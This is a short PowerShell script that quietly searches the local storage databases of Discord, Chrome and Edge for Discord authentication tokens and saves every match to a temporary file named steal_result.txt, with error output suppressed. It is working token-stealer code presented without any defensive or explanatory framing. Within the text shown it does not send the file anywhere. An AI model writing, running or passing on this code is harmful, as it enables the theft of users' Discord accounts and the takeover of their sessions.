$ErrorActionPreference = "SilentlyContinue"

$paths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
)

$outFile = "$env:TEMP\steal_result.txt"
$results = @()

foreach ($p in $paths) {
    if (Test-Path $p) {
        Get-ChildItem -Path $p -Filter *.ldb -Recurse | ForEach-Object {
            $content = Get-Content $_.FullName -Raw
            $matches = [regex]::Matches($content, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
            foreach ($m in $matches) {
                $results += "DISCORD|Unknown|Unknown|0|" + $m.Value
            }
        }
    }
}

if ($results.Count -gt 0) {
    $results | Out-File -FilePath $outFile -Encoding utf8
}
